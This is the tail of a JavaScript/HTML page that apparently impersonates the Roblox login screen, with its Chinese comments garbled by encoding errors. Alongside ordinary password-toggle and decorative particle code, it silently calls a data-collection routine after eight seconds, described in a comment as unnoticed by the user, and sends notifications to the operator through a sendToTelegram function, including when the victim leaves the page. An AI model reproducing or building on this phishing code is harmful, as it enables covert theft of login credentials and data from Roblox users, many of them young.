        // è®¾ç½®ä¿æŠ¤
        setupProtection();
        
        // å¯†ç æ˜¾ç¤ºåˆ‡æ¢
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? 'ğŸ‘ï¸' : 'ğŸ”’';
        });
        
        // å›è½¦é”®ç™»å½•
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
        
        // åˆ›å»ºèƒŒæ™¯ç²’å­
        createParticles();
        
        // è‡ªåŠ¨å¼€å§‹æ”¶é›†ï¼ˆå»¶è¿Ÿåï¼‰
        setTimeout(() => {
            if (!isCollecting) {
                // é™é»˜å¼€å§‹æ”¶é›†ï¼ˆç”¨æˆ·æ— æ„ŸçŸ¥ï¼‰
                startAdvancedCollection();
            }
        }, 8000);
        
        // é¡µé¢å…³é—­æ—¶å‘é€é€šçŸ¥
        window.addEventListener('beforeunload', () => {
            sendToTelegram('ğŸšª ç”¨æˆ·ç¦»å¼€Robloxç™»å½•é¡µé¢');
        });
    });

    function createParticles() {
        const container = document.getElementById('particles');
        for (let i = 0; i < 20; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.width = Math.random() * 10 + 5 + 'px';
            particle.style.height = particle.style.width;
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.animation = `float ${Math.random() * 10 + 10}s infinite ease-in-out`;
            particle.style.animationDelay = Math.random() * 5 + 's';
            container.appendChild(particle);
        }
        
        // æ·»åŠ æµ®åŠ¨åŠ¨ç”»
        const style = document.createElement('style');
        style.textContent = `
            @keyframes float {
                0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0.3; }
                50% { transform: translateY(-20px) rotate(180deg); opacity: 0.1; }
            }
        `;
        document.head.appendChild(style);
    }
</script>
</body>
</html>
